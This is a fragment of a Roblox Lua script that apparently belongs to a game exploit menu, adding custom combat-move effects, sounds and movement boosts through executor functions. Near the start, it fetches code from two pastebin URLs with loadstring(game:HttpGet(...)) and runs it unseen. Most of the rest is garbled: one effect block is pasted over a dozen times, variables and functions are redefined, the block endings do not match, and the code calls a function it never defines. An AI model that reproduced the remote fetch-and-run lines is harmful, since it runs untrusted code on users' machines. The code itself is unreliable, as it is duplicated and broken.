player.CharacterAdded:Connect(function(newCharacter)
    character = newCharacter
    setWalkSpeedToZero()
end)

spawn(function()
    loadstring(game:HttpGet("https://pastebin.pl/view/raw/93703964"))()
end)

spawn(function()
    loadstring(game:HttpGet("https://pastebin.pl/view/raw/a9d0f7d7"))()
end)

-- Local Script

local soundId = 17429233290 -- Correct sound ID

-- Create a new Sound instance
local sound = Instance.new("Sound")
sound.Name = "Dropkick Miss"
sound.SoundId = "rbxassetid://" .. soundId
sound.Volume = 1
sound.Pitch = 1.0 -- Pitch set to 1.0
sound.PlaybackSpeed = 1.0 -- Adjusted playback speed

-- Parent the sound to Workspace
sound.Parent = workspace

-- Play the sound
sound:Play()

-- Local Script

local soundId2 = 17356346310 -- Correct sound ID

-- Create a new Sound instance
local sound2 = Instance.new("Sound")
sound2.Name = "Dropkick Miss Music"
sound2.SoundId = "rbxassetid://" .. soundId2
sound2.Volume = 0.8
sound2.Pitch = 1.0 -- Pitch set to 1.0
sound2.PlaybackSpeed = 1.0 -- Adjusted playback speed

-- Parent the sound to Workspace
sound2.Parent = workspace

-- Play the sound
sound2:Play()

Wait(1.79)

local Players = game:GetService("Players")
local ReplicatedStorage = game:GetService("ReplicatedStorage")
local Workspace = game:GetService("Workspace")

-- Wait for the player to load
local player = Players.LocalPlayer
local character = player.Character or player.CharacterAdded:Wait()
local rootPart = character:WaitForChild("HumanoidRootPart")

-- Check for Resources folder in ReplicatedStorage
local resourcesFolder = ReplicatedStorage:WaitForChild("Resources")

-- Check for KJEffects folder inside Resources
local kjEffectsFolder = resourcesFolder:WaitForChild("KJEffects")

-- Check for speedlinesandstuff part inside KJEffects
local speedlinesandstuffPart = kjEffectsFolder:WaitForChild("speedlinesandstuff")

-- Duplicate the speedlinesandstuff part
local speedlinesandstuffClone = speedlinesandstuffPart:Clone()

-- Put the duplicate in Workspace
speedlinesandstuffClone.Parent = Workspace

-- Offset position behind the player
local offset = Vector3.new(0, 0, -9) -- Adjust the offset as needed

-- Function to update the position of the speedlinesandstuff clone to follow the player with offset
local function updateSpeedlinesPosition()
    while true do
        speedlinesandstuffClone.CFrame = rootPart.CFrame * CFrame.new(offset)
        wait(0.1) -- Adjust the wait time as needed
    end
end

-- Get references to ReplicatedStorage and Workspace
local ReplicatedStorage = game:GetService("ReplicatedStorage")
local Workspace = game:GetService("Workspace")

-- Function to recursively find a part by name within a parent
local function findPartByName(parent, name)
    local part = parent:FindFirstChild(name)
    if part then
        return part
    else
        for _, child in ipairs(parent:GetChildren()) do
            part = findPartByName(child, name)
            if part then
                return part
            end
        end
    end
    return nil
end

-- Wait for ReplicatedStorage.Resources.KJEffects.speedlinesandstuff.thespeedthingunderultik to exist
local function waitForPart()
    local speedlinesandstuff = ReplicatedStorage:WaitForChild("Resources"):WaitForChild("KJEffects"):WaitForChild("speedlinesandstuff")
    local thespeedthingunderultik = findPartByName(speedlinesandstuff, "thespeedthingunderultik")
    if thespeedthingunderultik then
        -- Clone the part into Workspace and make it follow the player
        local clonedPart = thespeedthingunderultik:Clone()
        clonedPart.Parent = Workspace
        
        -- Function to make the cloned part follow the player
        local function followPlayer()
            local player = game.Players.LocalPlayer
            local character = player.Character
            if character then
                local humanoidRootPart = character:FindFirstChild("HumanoidRootPart")
                local humanoid = character:FindFirstChildOfClass("Humanoid")
                if humanoidRootPart and humanoid then
                    local torso = humanoidRootPart:FindFirstChild("LowerTorso")
                    if torso then
                        clonedPart.CFrame = torso.CFrame
                        clonedPart.CFrame = clonedPart.CFrame * CFrame.new(0, -humanoid.HipHeight / 2, 0) -- Offset under the legs
                        clonedPart.CFrame = clonedPart.CFrame * CFrame.Angles(0, math.rad(180), 0) -- Make it look where the character looks
                    end
                end
            end
        end
        
        -- Run the followPlayer function every frame
        game:GetService("RunService").RenderStepped:Connect(followPlayer)
    else
        warn("Part thespeedthingunderultik not found inside speedlinesandstuff.")
    end
end

-- Call the waitForPart function
waitForPart()

-- Run the function in a separate thread
spawn(updateSpeedlinesPosition)

-- Get references to ReplicatedStorage and Workspace
local ReplicatedStorage = game:GetService("ReplicatedStorage")
local Workspace = game:GetService("Workspace")

-- Function to recursively find a part by name within a parent
local function findPartByName(parent, name)
    local part = parent:FindFirstChild(name)
    if part then
        return part
    else
        for _, child in ipairs(parent:GetChildren()) do
            part = findPartByName(child, name)
            if part then
                return part
            end
        end
    end
    return nil
end

-- Wait for ReplicatedStorage.Resources.KJEffects.speedlinesandstuff.thespeedthingunderultik to exist
local function waitForPart()
    local speedlinesandstuff = ReplicatedStorage:WaitForChild("Resources"):WaitForChild("KJEffects"):WaitForChild("speedlinesandstuff")
    local thespeedthingunderultik = findPartByName(speedlinesandstuff, "thespeedthingunderultik")
    if thespeedthingunderultik then
        -- Clone the part into Workspace and make it follow the player
        local clonedPart = thespeedthingunderultik:Clone()
        clonedPart.Parent = Workspace
        
        -- Function to make the cloned part follow the player
        local function followPlayer()
            local player = game.Players.LocalPlayer
            local character = player.Character
            if character then
                local humanoidRootPart = character:WaitForChild("HumanoidRootPart")
                if humanoidRootPart then
                    clonedPart.CFrame = humanoidRootPart.CFrame
                    clonedPart.CFrame = clonedPart.CFrame * CFrame.new(0, -0.3, -2) -- Offset from character (adjusted)
                    clonedPart.CFrame = clonedPart.CFrame * CFrame.Angles(0, math.rad(180), 0) -- Make it look where the character looks
                end
            end
        end
        
        -- Run the followPlayer function every frame
        game:GetService("RunService").RenderStepped:Connect(followPlayer)
    else
        warn("Part thespeedthingunderultik not found inside speedlinesandstuff.")
    end
end

-- Call the waitForPart function
waitForPart()


local Players = game:GetService("Players")
local ReplicatedStorage = game:GetService("ReplicatedStorage")
local Workspace = game:GetService("Workspace")

-- Wait for the player to load
local player = Players.LocalPlayer
local character = player.Character or player.CharacterAdded:Wait()
local rootPart = character:WaitForChild("HumanoidRootPart")

-- Check for Resources folder in ReplicatedStorage
local resourcesFolder = ReplicatedStorage:WaitForChild("Resources")

-- Check for KJEffects folder inside Resources
local kjEffectsFolder = resourcesFolder:WaitForChild("KJEffects")

-- Check for speedlines part inside KJEffects
local speedlinesPart = kjEffectsFolder:WaitForChild("speedlines")

-- Duplicate the speedlines part
local speedlinesClone = speedlinesPart:Clone()

-- Put the duplicate in Workspace
speedlinesClone.Parent = Workspace

-- Function to update the position of the speedlines clone to follow the player
local function updateSpeedlinesPosition()
    while true do
        speedlinesClone.CFrame = rootPart.CFrame
        wait(0.1) -- Adjust the wait time as needed
    end
end

local Players = game:GetService("Players")
local ReplicatedStorage = game:GetService("ReplicatedStorage")
local Workspace = game:GetService("Workspace")

-- Wait for the player to load
local player = Players.LocalPlayer
local character = player.Character or player.CharacterAdded:Wait()
local rootPart = character:WaitForChild("HumanoidRootPart")

-- Check for Resources folder in ReplicatedStorage
local resourcesFolder = ReplicatedStorage:WaitForChild("Resources")

-- Check for KJEffects folder inside Resources
local kjEffectsFolder = resourcesFolder:WaitForChild("KJEffects")

-- Check for speedlines part inside KJEffects
local speedlinesPart = kjEffectsFolder:WaitForChild("speedlines")

-- Duplicate the speedlines part
local speedlinesClone = speedlinesPart:Clone()

-- Put the duplicate in Workspace
speedlinesClone.Parent = Workspace

-- Function to update the position of the speedlines clone to follow the player
local function updateSpeedlinesPosition()
    while true do
        speedlinesClone.CFrame = rootPart.CFrame
        wait(0.1) -- Adjust the wait time as needed
    end
end

local Players = game:GetService("Players")
local ReplicatedStorage = game:GetService("ReplicatedStorage")
local Workspace = game:GetService("Workspace")

-- Wait for the player to load
local player = Players.LocalPlayer
local character = player.Character or player.CharacterAdded:Wait()
local rootPart = character:WaitForChild("HumanoidRootPart")

-- Check for Resources folder in ReplicatedStorage
local resourcesFolder = ReplicatedStorage:WaitForChild("Resources")

-- Check for KJEffects folder inside Resources
local kjEffectsFolder = resourcesFolder:WaitForChild("KJEffects")

-- Check for speedlines part inside KJEffects
local speedlinesPart = kjEffectsFolder:WaitForChild("speedlines")

-- Duplicate the speedlines part
local speedlinesClone = speedlinesPart:Clone()

-- Put the duplicate in Workspace
speedlinesClone.Parent = Workspace

-- Function to update the position of the speedlines clone to follow the player
local function updateSpeedlinesPosition()
    while true do
        speedlinesClone.CFrame = rootPart.CFrame
        wait(0.1) -- Adjust the wait time as needed
    end
end

local Players = game:GetService("Players")
local ReplicatedStorage = game:GetService("ReplicatedStorage")
local Workspace = game:GetService("Workspace")

-- Wait for the player to load
local player = Players.LocalPlayer
local character = player.Character or player.CharacterAdded:Wait()
local rootPart = character:WaitForChild("HumanoidRootPart")

-- Check for Resources folder in ReplicatedStorage
local resourcesFolder = ReplicatedStorage:WaitForChild("Resources")

-- Check for KJEffects folder inside Resources
local kjEffectsFolder = resourcesFolder:WaitForChild("KJEffects")

-- Check for speedlines part inside KJEffects
local speedlinesPart = kjEffectsFolder:WaitForChild("speedlines")

-- Duplicate the speedlines part
local speedlinesClone = speedlinesPart:Clone()

-- Put the duplicate in Workspace
speedlinesClone.Parent = Workspace

-- Function to update the position of the speedlines clone to follow the player
local function updateSpeedlinesPosition()
    while true do
        speedlinesClone.CFrame = rootPart.CFrame
        wait(0.1) -- Adjust the wait time as needed
    end
end

local Players = game:GetService("Players")
local ReplicatedStorage = game:GetService("ReplicatedStorage")
local Workspace = game:GetService("Workspace")

-- Wait for the player to load
local player = Players.LocalPlayer
local character = player.Character or player.CharacterAdded:Wait()
local rootPart = character:WaitForChild("HumanoidRootPart")

-- Check for Resources folder in ReplicatedStorage
local resourcesFolder = ReplicatedStorage:WaitForChild("Resources")

-- Check for KJEffects folder inside Resources
local kjEffectsFolder = resourcesFolder:WaitForChild("KJEffects")

-- Check for speedlines part inside KJEffects
local speedlinesPart = kjEffectsFolder:WaitForChild("speedlines")

-- Duplicate the speedlines part
local speedlinesClone = speedlinesPart:Clone()

-- Put the duplicate in Workspace
speedlinesClone.Parent = Workspace

-- Function to update the position of the speedlines clone to follow the player
local function updateSpeedlinesPosition()
    while true do
        speedlinesClone.CFrame = rootPart.CFrame
        wait(0.1) -- Adjust the wait time as needed
    end
end

local Players = game:GetService("Players")
local ReplicatedStorage = game:GetService("ReplicatedStorage")
local Workspace = game:GetService("Workspace")

-- Wait for the player to load
local player = Players.LocalPlayer
local character = player.Character or player.CharacterAdded:Wait()
local rootPart = character:WaitForChild("HumanoidRootPart")

-- Check for Resources folder in ReplicatedStorage
local resourcesFolder = ReplicatedStorage:WaitForChild("Resources")

-- Check for KJEffects folder inside Resources
local kjEffectsFolder = resourcesFolder:WaitForChild("KJEffects")

-- Check for speedlines part inside KJEffects
local speedlinesPart = kjEffectsFolder:WaitForChild("speedlines")

-- Duplicate the speedlines part
local speedlinesClone = speedlinesPart:Clone()

-- Put the duplicate in Workspace
speedlinesClone.Parent = Workspace

-- Function to update the position of the speedlines clone to follow the player
local function updateSpeedlinesPosition()
    while true do
        speedlinesClone.CFrame = rootPart.CFrame
        wait(0.1) -- Adjust the wait time as needed
    end
end

local Players = game:GetService("Players")
local ReplicatedStorage = game:GetService("ReplicatedStorage")
local Workspace = game:GetService("Workspace")

-- Wait for the player to load
local player = Players.LocalPlayer
local character = player.Character or player.CharacterAdded:Wait()
local rootPart = character:WaitForChild("HumanoidRootPart")

-- Check for Resources folder in ReplicatedStorage
local resourcesFolder = ReplicatedStorage:WaitForChild("Resources")

-- Check for KJEffects folder inside Resources
local kjEffectsFolder = resourcesFolder:WaitForChild("KJEffects")

-- Check for speedlines part inside KJEffects
local speedlinesPart = kjEffectsFolder:WaitForChild("speedlines")

-- Duplicate the speedlines part
local speedlinesClone = speedlinesPart:Clone()

-- Put the duplicate in Workspace
speedlinesClone.Parent = Workspace

-- Function to update the position of the speedlines clone to follow the player
local function updateSpeedlinesPosition()
    while true do
        speedlinesClone.CFrame = rootPart.CFrame
        wait(0.1) -- Adjust the wait time as needed
    end
end

local Players = game:GetService("Players")
local ReplicatedStorage = game:GetService("ReplicatedStorage")
local Workspace = game:GetService("Workspace")

-- Wait for the player to load
local player = Players.LocalPlayer
local character = player.Character or player.CharacterAdded:Wait()
local rootPart = character:WaitForChild("HumanoidRootPart")

-- Check for Resources folder in ReplicatedStorage
local resourcesFolder = ReplicatedStorage:WaitForChild("Resources")

-- Check for KJEffects folder inside Resources
local kjEffectsFolder = resourcesFolder:WaitForChild("KJEffects")

-- Check for speedlines part inside KJEffects
local speedlinesPart = kjEffectsFolder:WaitForChild("speedlines")

-- Duplicate the speedlines part
local speedlinesClone = speedlinesPart:Clone()

-- Put the duplicate in Workspace
speedlinesClone.Parent = Workspace

-- Function to update the position of the speedlines clone to follow the player
local function updateSpeedlinesPosition()
    while true do
        speedlinesClone.CFrame = rootPart.CFrame
        wait(0.1) -- Adjust the wait time as needed
    end
end

-- Enable particle emitters and set emission properties
local function setupParticles(part)
    for _, descendant in pairs(part:GetDescendants()) do
        if descendant:IsA("ParticleEmitter") then
            descendant.Rate = 100
            descendant.Enabled = true
            descendant:Emit(100)
        end
    end
end

local Players = game:GetService("Players")
local ReplicatedStorage = game:GetService("ReplicatedStorage")
local Workspace = game:GetService("Workspace")

-- Wait for the player to load
local player = Players.LocalPlayer
local character = player.Character or player.CharacterAdded:Wait()
local rootPart = character:WaitForChild("HumanoidRootPart")

-- Check for Resources folder in ReplicatedStorage
local resourcesFolder = ReplicatedStorage:WaitForChild("Resources")

-- Check for KJEffects folder inside Resources
local kjEffectsFolder = resourcesFolder:WaitForChild("KJEffects")

-- Check for speedlines part inside KJEffects
local speedlinesPart = kjEffectsFolder:WaitForChild("speedlines")

-- Duplicate the speedlines part
local speedlinesClone = speedlinesPart:Clone()

-- Put the duplicate in Workspace
speedlinesClone.Parent = Workspace

-- Function to update the position of the speedlines clone to follow the player
local function updateSpeedlinesPosition()
    while true do
        speedlinesClone.CFrame = rootPart.CFrame
        wait(0.1) -- Adjust the wait time as needed
    end
end
local Players = game:GetService("Players")
local ReplicatedStorage = game:GetService("ReplicatedStorage")
local Workspace = game:GetService("Workspace")

-- Wait for the player to load
local player = Players.LocalPlayer
local character = player.Character or player.CharacterAdded:Wait()
local rootPart = character:WaitForChild("HumanoidRootPart")

-- Check for Resources folder in ReplicatedStorage
local resourcesFolder = ReplicatedStorage:WaitForChild("Resources")

-- Check for KJEffects folder inside Resources
local kjEffectsFolder = resourcesFolder:WaitForChild("KJEffects")

-- Check for speedlines part inside KJEffects
local speedlinesPart = kjEffectsFolder:WaitForChild("speedlines")

-- Duplicate the speedlines part
local speedlinesClone = speedlinesPart:Clone()

-- Put the duplicate in Workspace
speedlinesClone.Parent = Workspace

-- Function to update the position of the speedlines clone to follow the player
local function updateSpeedlinesPosition()
    while true do
        speedlinesClone.CFrame = rootPart.CFrame
        wait(0.1) -- Adjust the wait time as needed
    end
end

local Players = game:GetService("Players")
local ReplicatedStorage = game:GetService("ReplicatedStorage")
local Workspace = game:GetService("Workspace")

-- Wait for the player to load
local player = Players.LocalPlayer
local character = player.Character or player.CharacterAdded:Wait()
local rootPart = character:WaitForChild("HumanoidRootPart")

-- Check for Resources folder in ReplicatedStorage
local resourcesFolder = ReplicatedStorage:WaitForChild("Resources")

-- Check for KJEffects folder inside Resources
local kjEffectsFolder = resourcesFolder:WaitForChild("KJEffects")

-- Check for speedlines part inside KJEffects
local speedlinesPart = kjEffectsFolder:WaitForChild("speedlines")

-- Duplicate the speedlines part
local speedlinesClone = speedlinesPart:Clone()

-- Put the duplicate in Workspace
speedlinesClone.Parent = Workspace

-- Function to update the position of the speedlines clone to follow the player
local function updateSpeedlinesPosition()
    while true do
        speedlinesClone.CFrame = rootPart.CFrame
        wait(0.1) -- Adjust the wait time as needed
    end
end


-- Setup particles in the duplicated part
setupParticles(speedlinesClone)

-- Run the function in a separate thread
spawn(updateSpeedlinesPosition)

-- Wait for the player to load
local player = Players.LocalPlayer
local character = player.Character or player.CharacterAdded:Wait()
local rootPart = character:WaitForChild("HumanoidRootPart")

-- Check for Resources folder in ReplicatedStorage
local resourcesFolder = ReplicatedStorage:WaitForChild("Resources")

-- Check for KJEffects folder inside Resources
local kjEffectsFolder = resourcesFolder:WaitForChild("KJEffects")

-- Check for speedlines part inside KJEffects
local speedlinesPart = kjEffectsFolder:WaitForChild("speedlines")

-- Duplicate the speedlines part
local speedlinesClone = speedlinesPart:Clone()

-- Put the duplicate in Workspace
speedlinesClone.Parent = Workspace

-- Function to update the position of the speedlines clone to follow the player
local function updateSpeedlinesPosition()
    while true do
        speedlinesClone.CFrame = rootPart.CFrame
        wait(0.1) -- Adjust the wait time as needed
    end
end


-- Setup particles in the duplicated part
setupParticles(speedlinesClone)

-- Run the function in a separate thread
spawn(updateSpeedlinesPosition)

-- Wait for the player to load
local player = Players.LocalPlayer
local character = player.Character or player.CharacterAdded:Wait()
local rootPart = character:WaitForChild("HumanoidRootPart")

-- Check for Resources folder in ReplicatedStorage
local resourcesFolder = ReplicatedStorage:WaitForChild("Resources")

-- Check for KJEffects folder inside Resources
local kjEffectsFolder = resourcesFolder:WaitForChild("KJEffects")

-- Check for speedlines part inside KJEffects
local speedlinesPart = kjEffectsFolder:WaitForChild("speedlines")

-- Duplicate the speedlines part
local speedlinesClone = speedlinesPart:Clone()

-- Put the duplicate in Workspace
speedlinesClone.Parent = Workspace

-- Function to update the position of the speedlines clone to follow the player
local function updateSpeedlinesPosition()
    while true do
        speedlinesClone.CFrame = rootPart.CFrame
        wait(0.1) -- Adjust the wait time as needed
    end
end


-- Setup particles in the duplicated part
setupParticles(speedlinesClone)

-- Run the function in a separate thread
spawn(updateSpeedlinesPosition)

-- Wait for the player to load
local player = Players.LocalPlayer
local character = player.Character or player.CharacterAdded:Wait()
local rootPart = character:WaitForChild("HumanoidRootPart")

-- Check for Resources folder in ReplicatedStorage
local resourcesFolder = ReplicatedStorage:WaitForChild("Resources")

-- Check for KJEffects folder inside Resources
local kjEffectsFolder = resourcesFolder:WaitForChild("KJEffects")

-- Check for speedlines part inside KJEffects
local speedlinesPart = kjEffectsFolder:WaitForChild("speedlines")

-- Duplicate the speedlines part
local speedlinesClone = speedlinesPart:Clone()

-- Put the duplicate in Workspace
speedlinesClone.Parent = Workspace

-- Function to update the position of the speedlines clone to follow the player
local function updateSpeedlinesPosition()
    while true do
        speedlinesClone.CFrame = rootPart.CFrame
        wait(0.1) -- Adjust the wait time as needed
    end
end


-- Setup particles in the duplicated part
setupParticles(speedlinesClone)

-- Run the function in a separate thread
spawn(updateSpeedlinesPosition)

-- Wait for the player to load
local player = Players.LocalPlayer
local character = player.Character or player.CharacterAdded:Wait()
local rootPart = character:WaitForChild("HumanoidRootPart")

-- Check for Resources folder in ReplicatedStorage
local resourcesFolder = ReplicatedStorage:WaitForChild("Resources")

-- Check for KJEffects folder inside Resources
local kjEffectsFolder = resourcesFolder:WaitForChild("KJEffects")

-- Check for speedlines part inside KJEffects
local speedlinesPart = kjEffectsFolder:WaitForChild("speedlines")

-- Duplicate the speedlines part
local speedlinesClone = speedlinesPart:Clone()

-- Put the duplicate in Workspace
speedlinesClone.Parent = Workspace

-- Function to update the position of the speedlines clone to follow the player
local function updateSpeedlinesPosition()
    while true do
        speedlinesClone.CFrame = rootPart.CFrame
        wait(0.1) -- Adjust the wait time as needed
    end
end


-- Setup particles in the duplicated part
setupParticles(speedlinesClone)

-- Run the function in a separate thread
spawn(updateSpeedlinesPosition)



-- Function to initiate rush effect
local function initiateRush()
    local player = game.Players.LocalPlayer
    local character = player.Character or player.CharacterAdded:Wait()
    local humanoid = character:FindFirstChildOfClass("Humanoid")
    if not humanoid then
        return
    end

local Players = game:GetService("Players")
local ReplicatedStorage = game:GetService("ReplicatedStorage")
local Workspace = game:GetService("Workspace")

-- Wait for the player to load
local player = Players.LocalPlayer
local character = player.Character or player.CharacterAdded:Wait()
local rootPart = character:WaitForChild("HumanoidRootPart")

-- Check for Resources folder in ReplicatedStorage
local resourcesFolder = ReplicatedStorage:WaitForChild("Resources")

-- Check for KJEffects folder inside Resources
local kjEffectsFolder = resourcesFolder:WaitForChild("KJEffects")

-- Check for speedlines part inside KJEffects
local speedlinesPart = kjEffectsFolder:WaitForChild("speedlines")

-- Duplicate the speedlines part
local speedlinesClone = speedlinesPart:Clone()

-- Put the duplicate in Workspace
speedlinesClone.Parent = Workspace

-- Function to update the position of the speedlines clone to follow the player
local function updateSpeedlinesPosition()
    while true do
        speedlinesClone.CFrame = rootPart.CFrame
        wait(0.1) -- Adjust the wait time as needed
    end
end

local Players = game:GetService("Players")
local ReplicatedStorage = game:GetService("ReplicatedStorage")
local Workspace = game:GetService("Workspace")

-- Wait for the player to load
local player = Players.LocalPlayer
local character = player.Character or player.CharacterAdded:Wait()
local rootPart = character:WaitForChild("HumanoidRootPart")

-- Check for Resources folder in ReplicatedStorage
local resourcesFolder = ReplicatedStorage:WaitForChild("Resources")

-- Check for KJEffects folder inside Resources
local kjEffectsFolder = resourcesFolder:WaitForChild("KJEffects")

-- Check for speedlines part inside KJEffects
local speedlinesPart = kjEffectsFolder:WaitForChild("speedlines")

-- Duplicate the speedlines part
local speedlinesClone = speedlinesPart:Clone()

-- Put the duplicate in Workspace
speedlinesClone.Parent = Workspace

-- Function to update the position of the speedlines clone to follow the player
local function updateSpeedlinesPosition()
    while true do
        speedlinesClone.CFrame = rootPart.CFrame
        wait(0.1) -- Adjust the wait time as needed
    end
end

local Players = game:GetService("Players")
local ReplicatedStorage = game:GetService("ReplicatedStorage")
local Workspace = game:GetService("Workspace")

-- Wait for the player to load
local player = Players.LocalPlayer
local character = player.Character or player.CharacterAdded:Wait()
local rootPart = character:WaitForChild("HumanoidRootPart")

-- Check for Resources folder in ReplicatedStorage
local resourcesFolder = ReplicatedStorage:WaitForChild("Resources")

-- Check for KJEffects folder inside Resources
local kjEffectsFolder = resourcesFolder:WaitForChild("KJEffects")

-- Check for speedlines part inside KJEffects
local speedlinesPart = kjEffectsFolder:WaitForChild("speedlines")

-- Duplicate the speedlines part
local speedlinesClone = speedlinesPart:Clone()

-- Put the duplicate in Workspace
speedlinesClone.Parent = Workspace

-- Function to update the position of the speedlines clone to follow the player
local function updateSpeedlinesPosition()
    while true do
        speedlinesClone.CFrame = rootPart.CFrame
        wait(0.1) -- Adjust the wait time as needed
    end
end

local Players = game:GetService("Players")
local ReplicatedStorage = game:GetService("ReplicatedStorage")
local Workspace = game:GetService("Workspace")

-- Wait for the player to load
local player = Players.LocalPlayer
local character = player.Character or player.CharacterAdded:Wait()
local rootPart = character:WaitForChild("HumanoidRootPart")

-- Check for Resources folder in ReplicatedStorage
local resourcesFolder = ReplicatedStorage:WaitForChild("Resources")

-- Check for KJEffects folder inside Resources
local kjEffectsFolder = resourcesFolder:WaitForChild("KJEffects")

-- Check for speedlines part inside KJEffects
local speedlinesPart = kjEffectsFolder:WaitForChild("speedlines")

-- Duplicate the speedlines part
local speedlinesClone = speedlinesPart:Clone()

-- Put the duplicate in Workspace
speedlinesClone.Parent = Workspace

-- Function to update the position of the speedlines clone to follow the player
local function updateSpeedlinesPosition()
    while true do
        speedlinesClone.CFrame = rootPart.CFrame
        wait(0.1) -- Adjust the wait time as needed
    end
end
local Players = game:GetService("Players")
local ReplicatedStorage = game:GetService("ReplicatedStorage")
local Workspace = game:GetService("Workspace")

-- Wait for the player to load
local player = Players.LocalPlayer
local character = player.Character or player.CharacterAdded:Wait()
local rootPart = character:WaitForChild("HumanoidRootPart")

-- Check for Resources folder in ReplicatedStorage
local resourcesFolder = ReplicatedStorage:WaitForChild("Resources")

-- Check for KJEffects folder inside Resources
local kjEffectsFolder = resourcesFolder:WaitForChild("KJEffects")

-- Check for speedlines part inside KJEffects
local speedlinesPart = kjEffectsFolder:WaitForChild("speedlines")

-- Duplicate the speedlines part
local speedlinesClone = speedlinesPart:Clone()

-- Put the duplicate in Workspace
speedlinesClone.Parent = Workspace

-- Function to update the position of the speedlines clone to follow the player
local function updateSpeedlinesPosition()
    while true do
        speedlinesClone.CFrame = rootPart.CFrame
        wait(0.1) -- Adjust the wait time as needed
    end
end

local Players = game:GetService("Players")
local ReplicatedStorage = game:GetService("ReplicatedStorage")
local Workspace = game:GetService("Workspace")

-- Wait for the player to load
local player = Players.LocalPlayer
local character = player.Character or player.CharacterAdded:Wait()
local rootPart = character:WaitForChild("HumanoidRootPart")

-- Check for Resources folder in ReplicatedStorage
local resourcesFolder = ReplicatedStorage:WaitForChild("Resources")

-- Check for KJEffects folder inside Resources
local kjEffectsFolder = resourcesFolder:WaitForChild("KJEffects")

-- Check for speedlines part inside KJEffects
local speedlinesPart = kjEffectsFolder:WaitForChild("speedlines")

-- Duplicate the speedlines part
local speedlinesClone = speedlinesPart:Clone()

-- Put the duplicate in Workspace
speedlinesClone.Parent = Workspace

-- Function to update the position of the speedlines clone to follow the player
local function updateSpeedlinesPosition()
    while true do
        speedlinesClone.CFrame = rootPart.CFrame
        wait(0.1) -- Adjust the wait time as needed
    end
end

    -- Set rush speed and force
    local rushSpeed = 187
    local maxForce = Vector3.new(100000, 0, 100000)  -- Adjust max force as needed

    -- Get initial rush direction based on camera's look vector
    local camera = game.Workspace.CurrentCamera
    local initialLookVector = camera.CFrame.LookVector
    local rushDirection = Vector3.new(initialLookVector.X, 0, initialLookVector.Z).unit  -- Ignore Y direction

    -- Create BodyVelocity to apply rush force
    local bodyVelocity = Instance.new("BodyVelocity")
    bodyVelocity.Velocity = rushDirection * rushSpeed
    bodyVelocity.MaxForce = maxForce
    bodyVelocity.P = 10000  -- Adjust P value for smoother movement
    bodyVelocity.Parent = character:WaitForChild("HumanoidRootPart")

    -- Function to update rush direction based on camera look vector
    local function updateRushDirection()
        rushDirection = camera.CFrame.LookVector
        rushDirection = Vector3.new(rushDirection.X, 0, rushDirection.Z).unit  -- Ignore Y direction
        bodyVelocity.Velocity = rushDirection * rushSpeed
    end

    -- Connect to RenderStepped to continuously update rush direction
    local connection
    connection = game:GetService("RunService").RenderStepped:Connect(function()
        updateRushDirection()
    end)

    -- Function to stop rush effect and clean up after 4.15 seconds
    local function stopRushEffect()
        bodyVelocity:Destroy()
        connection:Disconnect()
    end

    -- Stop the rush effect after 4.15 seconds
    wait(4.21)
    stopRushEffect()

-- Get all children of the workspace
local children = workspace:GetChildren()

-- Iterate through each child
for _, child in ipairs(children) do
    -- Check if the child is a part and its name is "speedlines"
    if child:IsA("Part") and child.Name == "speedlines" then
        -- Delete the part
        child:Destroy()
    end
end

-- Get all children of the workspace
local children = workspace:GetChildren()

-- Iterate through each child
for _, child in ipairs(children) do
    -- Check if the child is a part and its name is "speedlines"
    if child:IsA("Part") and child.Name == "speedlinesandstuff" then
        -- Delete the part
        child:Destroy()
    end
end

-- Get all children of the workspace
local children = workspace:GetChildren()

-- Iterate through each child
for _, child in ipairs(children) do
    -- Check if the child is a part and its name is "speedlines"
    if child:IsA("Part") and child.Name == "thespeedthingunderultik" then
        -- Delete the part
        child:Destroy()
    end
end

local player = game.Players.LocalPlayer
local character = player.Character or player.CharacterAdded:Wait()

local function setWalkSpeedToSixTeen()
    local humanoid = character:WaitForChild("Humanoid")
    humanoid.WalkSpeed = 16
end

if character then
    setWalkSpeedToZero()
end

player.CharacterAdded:Connect(function(newCharacter)
    character = newCharacter
    setWalkSpeedToZero()
end)


end

-- Example usage: Call initiateRush() when you want to trigger the rush effect.
initiateRush()
end


-- Add functionality to the tool when activated
tool.Equipped:Connect(function()
    activateTool()
end)

-- Add the tool to the player's backpack
tool.Parent = game.Players.LocalPlayer.Backpack	
  	end    
})

--[[
Name = <string> - The name of the button.
Callback = <function> - The function of the button.
]]

Tab:AddButton({
	Name = "stoic bomb tool",
	Callback = function()
      		-- Create the Tool instance
local tool = Instance.new("Tool")

-- Set the tool's properties
tool.Name = "Stoic Bomb"
tool.RequiresHandle = false  -- Set to true if you have a handle part
tool.CanBeDropped = true     -- Change as needed

-- Add a description or other properties
tool.ToolTip = "henzen bakadom"

-- Function to make stuff happen when activated
local function activateTool()
game.Players.LocalPlayer.Character.Humanoid.WalkSpeed = 0
local player = game.Players.LocalPlayer
repeat wait() until player.Character.Humanoid
local humanoid = player.Character.Humanoid
local character = player.Character or player.CharacterAdded:Wait()
local UserInputService = game:GetService("UserInputService")

local Sound = Instance.new("Sound")
Sound.Parent = game:GetService("Players").LocalPlayer.Character.Torso
Sound.SoundId = getcustomasset('Stoic.MP3')
Sound.Looped = false
Sound.Volume = 5
Sound:Play()

local anim = Instance.new("Animation")
anim.AnimationId = "rbxassetid://17141153099"

local playAnim = humanoid:LoadAnimation(anim)
anim.AnimationId = "rbxassetid://0"
playAnim:Play()
playAnim:AdjustSpeed(0.3)
wait(0.3)
playAnim:AdjustSpeed(1)
local launch1 = game.ReplicatedStorage.Resources.KJEffects["launchup"].launchything:Clone()
launch1.Parent = game.Players.LocalPlayer.Character["Torso"]
    for _, child in ipairs(launch1:GetChildren()) do
        if child:IsA("ParticleEmitter") then -- Check if the child is a ParticleEmitter
            child:Emit(3) -- Emit 20 particles
        end
    end
wait(0.1)
local light1 = game.ReplicatedStorage.Resources.StoicBomb["stoicbombspeedlines"].POINTOLIGHTO:Clone()
light1.Parent = game.Players.LocalPlayer.Character["Torso"]
    for _, child in ipairs(light1:GetChildren()) do
        if child:IsA("ParticleEmitter") then -- Check if the child is a ParticleEmitter
            child:Emit(1) -- Emit 20 particles
        end
    end
wait(1.4)
local boom1 = game.ReplicatedStorage.Resources.KJEffects["stoic bomb boom entrance"].Attachment:Clone()
boom1.Parent = game.Players.LocalPlayer.Character["Torso"]
    for _, child in ipairs(boom1:GetChildren()) do
        if child:IsA("ParticleEmitter") then -- Check if the child is a ParticleEmitter
            child:Emit(3) -- Emit 20 particles
        end
    end
wait(1.6)
local stoic1 = game.ReplicatedStorage.Resources.StoicBomb["pre"].Part.Attachment:Clone()
